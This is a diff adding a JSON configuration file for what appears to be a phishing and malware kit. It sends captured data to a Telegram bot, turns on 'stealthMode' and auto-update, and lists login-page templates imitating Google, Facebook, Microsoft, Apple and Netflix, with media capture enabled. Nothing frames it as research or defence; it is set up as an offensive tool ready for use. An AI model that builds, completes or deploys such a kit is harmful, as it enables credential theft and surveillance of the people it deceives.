@@ -1,1 +1,23 @@
-
+{
+  "telegram": {
+    "botToken": "YOUR_BOT_TOKEN_HERE",
+    "chatId": "YOUR_CHAT_ID",
+    "adminId": "YOUR_ADMIN_ID"
+  },
+  "server": {
+    "port": 5000,
+    "host": "0.0.0.0",
+    "use1pt": true,
+    "hostURL": "https://your-domain.here"
+  },
+  "security": {
+    "encryptionKey": "advanced-malware-encryption-2024",
+    "stealthMode": true,
+    "autoUpdate": true
+  },
+  "phishing": {
+    "templates": ["google", "facebook", "microsoft", "apple", "netflix"],
+    "redirectDelay": 3000,
+    "captureMedia": true
+  }
+}
